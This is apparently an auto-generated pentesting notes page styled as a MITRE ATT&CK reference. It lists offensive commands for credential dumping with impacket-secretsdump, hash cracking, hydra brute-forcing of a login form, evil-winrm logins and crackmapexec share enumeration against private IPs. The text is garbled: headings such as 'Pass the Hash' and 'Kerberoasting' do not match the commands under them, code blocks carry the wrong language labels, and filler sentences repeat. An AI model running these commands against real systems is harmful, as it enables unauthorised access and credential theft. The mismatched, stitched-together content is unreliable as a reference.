---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "malware, oscp, persistence, linux, privilege escalation, windows"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-692.html"
URL_IMAGES: ""
Date: "2024-07-27"
Tags: "Malware, OSCP, Persistence, Linux, Privilege Escalation, Windows"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-692"
Permalink: "/notes/note-mitre-att&ck-framework-reference-692.html"
BtnLabel: "Read Notes"
Pick: 0
---
## NTLM Relay

### Pass the Hash

- `SQL Injection`
- `ACL Abuse`
- `lookupsid`
- `LXD Privilege Escalation`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.41.25.99
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.18.148.243 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## rubeus

### Nginx

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.125.133.235/FUZZ
evil-winrm -i 10.24.67.93 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.92.115.136 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.38.40.7 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

## Writable PATH

### Command Injection

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.71.7.166 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p80,1433,135 10.23.208.102 -oN scan.txt
```

```python
gobuster dir -u http://10.41.153.200/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Weak Service Permissions

### Kerberoasting

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.80.74.246 -u administrator -p 'P@ssw0rd!' --shares
```

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

> **Note:** Cron Job was identified as the primary attack vector in this scenario.
